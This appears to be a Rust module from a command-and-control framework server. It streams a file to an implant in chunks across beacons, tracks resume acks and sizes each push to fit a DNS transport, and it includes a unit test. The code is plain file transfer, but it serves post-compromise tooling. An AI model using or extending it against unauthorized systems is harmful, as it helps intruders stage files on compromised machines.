use std::collections::HashMap;
use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use nw_profile::msgs::FileChunk;
use uuid::Uuid;

/// Chunk size for a server->implant file push (matches the download side).
const CHUNK: u64 = 1024;

/// One active server->implant upload: source file + destination + progress.
pub struct Upload {
    src: PathBuf,
    dest: String,
    /// Next byte of `src` to send (server-confirmed resume point).
    offset: u64,
    total: u64,
}

/// Per-session registry of active uploads (server pushing a local file out to
/// an agent). One active upload per session, streamed across beacons.
#[derive(Clone, Default)]
pub struct UploadStore {
    inner: Arc<Mutex<HashMap<Uuid, Upload>>>,
}

impl UploadStore {
    pub fn start(&self, session: &Uuid, src: PathBuf, dest: String) -> Result<(), String> {
        let total = File::open(&src)
            .and_then(|f| f.metadata())
            .map_err(|e| format!("open {src:?}: {e}"))?
            .len();
        let mut map = self.inner.lock().unwrap();
        if map.contains_key(session) {
            return Err("an upload is already in progress for this session".into());
        }
        map.insert(
            *session,
            Upload {
                src,
                dest,
                offset: 0,
                total,
            },
        );
        Ok(())
    }

    /// Apply an agent ack: advance the resume point. Removes the job once the
    /// whole file is confirmed received.
    pub fn apply_ack(&self, session: &Uuid, received: u64, done: bool) {
        let mut map = self.inner.lock().unwrap();
        if let Some(u) = map.get_mut(session) {
            if done {
                map.remove(session);
            } else {
                u.offset = received;
            }
        }
    }

    /// Read up to `budget` raw source bytes for this session, from the current
    /// offset, as push chunks.
    ///
    /// ponytail: cap the whole push at `budget` (the implant's per-frame inner
    /// budget) so the reply always fits even the tightest DNS transport; this
    /// competes with task delivery when both are pending, trading speed for a
    /// guaranteed fit. Fine for the low volume of C2 file pushes.
    pub fn push_budget(&self, session: &Uuid, budget: usize) -> Vec<FileChunk> {
        let mut map = self.inner.lock().unwrap();
        let u = match map.get_mut(session) {
            Some(u) => u,
            None => return Vec::new(),
        };
        if u.offset >= u.total || budget == 0 {
            return Vec::new();
        }
        let file = match File::open(&u.src) {
            Ok(f) => f,
            Err(_) => return Vec::new(),
        };
        let mut chunks = Vec::new();
        let mut remaining = budget as u64;
        let mut offset = u.offset;
        let mut rd = file;
        while remaining > 0 && offset < u.total {
            let take = remaining.min(CHUNK).min(u.total - offset) as usize;
            let _ = rd.seek(SeekFrom::Start(offset)).ok();
            let mut buf = vec![0u8; take];
            let n = rd.read(&mut buf).unwrap_or(0);
            if n == 0 {
                break;
            }
            buf.truncate(n);
            chunks.push(FileChunk {
                name: u.dest.clone(),
                offset,
                total: u.total,
                data: buf,
            });
            offset += n as u64;
            remaining -= n as u64;
        }
        u.offset = offset;
        chunks
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn pushes_and_advances_cursor() {
        let dir = std::env::temp_dir();
        let src = dir.join(format!("nw-up-src-{}.bin", std::process::id()));
        let mut f = std::fs::File::create(&src).unwrap();
        let data: Vec<u8> = (0..3000u32).map(|i| (i % 251) as u8).collect();
        f.write_all(&data).unwrap();
        drop(f);

        let store = UploadStore::default();
        let sid = Uuid::new_v4();
        store
            .start(&sid, src.clone(), "/tmp/out.bin".into())
            .unwrap();

        let c0 = store.push_budget(&sid, 2048);
        assert_eq!(c0.len(), 2);
        assert_eq!(c0[0].offset, 0);
        assert_eq!(c0[1].offset, 1024);

        // A resume ack rewinds the server cursor.
        store.apply_ack(&sid, 1024, false);
        let c1 = store.push_budget(&sid, 4096);
        assert_eq!(c1[0].offset, 1024);

        // Confirming done removes the job.
        store.apply_ack(&sid, 3000, true);
        assert!(store.push_budget(&sid, 4096).is_empty());

        std::fs::remove_file(&src).ok();
    }
}
